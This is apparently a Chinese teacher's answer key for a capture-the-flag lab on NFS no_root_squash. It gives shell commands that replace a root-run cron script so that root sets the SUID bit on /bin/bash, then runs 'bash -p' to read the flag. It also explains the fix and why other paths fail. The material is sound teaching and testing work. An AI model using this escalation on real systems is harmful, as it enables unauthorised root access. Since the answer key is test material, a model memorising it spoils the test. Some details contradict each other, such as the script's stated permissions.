# 第 8 题（教师版）：NFS no_root_squash

> **唯一提权面**：`/srv/nfs-share` 导出配置为 `no_root_squash`，目录 `root:nfs 0775`（**无 sticky 位**），
> 且 root 的 cron 任务**直接从共享目录里执行** `/srv/nfs-share/share-check.sh`。
> `player` 属于 `nfs` 组，可删除/替换共享里的文件。
> **唯一解**：用同名脚本替换 `share-check.sh`，等 cron 执行 → `/bin/bash` 变 SUID → `bash -p`。
> **已刻意堵死**：`/etc/cron.d/share`、`/etc/exports*`、`/usr/local/sbin/nfsmnt.sh`、`/var/nfs/client` 均不可写；
> 共享目录**没有 sticky 位**是设计要点（有 sticky 位就无法替换 root 的文件）。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/srv/nfs-share` | `root:nfs 0775` | **可写且无 sticky 位**：可替换文件 |
| `/srv/nfs-share/share-check.sh` | `root:root 0755` | **唯一提权面**：root 从共享里执行它 |
| `/etc/exports`、`/etc/exports.d/share.exports` | `root:root 0644` | 导出配置（只读，学习用） |
| `/usr/local/sbin/nfsmnt.sh` | `root:root 0755` | 模拟客户端挂载（cp -a 保留属主） |
| `/etc/cron.d/share` | `root:root 0644` | 每分钟：`nfsmnt.sh && bash /srv/nfs-share/share-check.sh` |

`player`：uid 1001，附加组 `nfs`。

## 二、唯一解

```bash
cat /etc/exports
# /srv/nfs-share 192.168.0.0/16(rw,sync,no_root_squash,insecure)

id | grep nfs
ls -ld /srv/nfs-share
# drwxrwxr-x 2 root nfs  /srv/nfs-share      <-- 组可写，无 sticky

ls -l /srv/nfs-share/share-check.sh
# -rwxr-xr-x 1 root root ... share-check.sh  <-- root 的脚本，但目录允许我删它

# 注意：直接 `>` 覆盖会 Permission denied（文件属主 root、664）。
# 正确手法：先删（目录无 sticky 位，组可写 => 可删），再创建同名文件。
rm -f /srv/nfs-share/share-check.sh
cat > /srv/nfs-share/share-check.sh <<'EOF'
#!/bin/bash
chmod 4755 /bin/bash
EOF
chmod +x /srv/nfs-share/share-check.sh

# 等 1 分钟
tail -2 /var/log/share-check.log
/bin/bash -p
id
cat /flag.txt
```

### 关键点讲解

- **`no_root_squash` 的含义**：默认（`root_squash`）客户端 root 被映射成 `nobody`；
  关闭 squash 后，客户端 root 写入的文件在服务端**保持 root 属主**。
- 单靠 `no_root_squash` 还不一定能提权，**真正的漏洞是“root 执行共享目录里的脚本”**——
  这跟第 3、5 题同源（可写 + 被 root 执行），但多了 NFS 这个上下文。
- 修复：导出加 `root_squash`（默认即可）；共享里只放**数据**不放**可执行脚本**；
  万不得已要给目录加 **sticky 位**，并让 root 执行共享外的脚本。
- 真实世界里这个组合非常常见：团队共享目录 + 运维脚本 + NFS 导出。

## 三、为什么只有这一条解

| 思路 | 失败原因 |
|---|---|
| 改 `/etc/exports` | 0644 root，不可写 |
| 改 `/etc/cron.d/share` | 0644 root，不可写 |
| 改 `/usr/local/sbin/nfsmnt.sh` | 0755 root 属主，不在共享里 |
| 改 `/var/nfs/client` 里的内容 | 目录 root 属主 755，不可写 |
| 在共享里放同名文件但保留原脚本 | 必须**替换**，因为执行的是固定路径 |

## 四、单解验证

```bash
# 正向
cat > /srv/nfs-share/share-check.sh <<'EOF'
#!/bin/bash
chmod 4755 /bin/bash
EOF
chmod +x /srv/nfs-share/share-check.sh
sleep 65
ls -l /bin/bash
/bin/bash -p -c 'id; cat /flag.txt'

# 负向
echo x >> /etc/exports            # Permission denied
echo x >> /etc/cron.d/share       # Permission denied
touch /usr/local/sbin/nfsmnt.sh   # Permission denied
```

## 五、关于“用户态模拟”的说明

真实 NFS 需要 `nfs-kernel-server` + 特权容器，与“只给端口和镜像名”的启动方式冲突。
本题用 `nfsmnt.sh` 模拟了 `no_root_squash` 的关键语义（客户端 root 写入 → 服务端保持 root 属主），
其余行为（导出配置、组权限、无 sticky 位、root 执行共享内脚本）与真实环境一致。
若需真实版，见 `deploy.md` 的“可选：真实 NFS 版”。
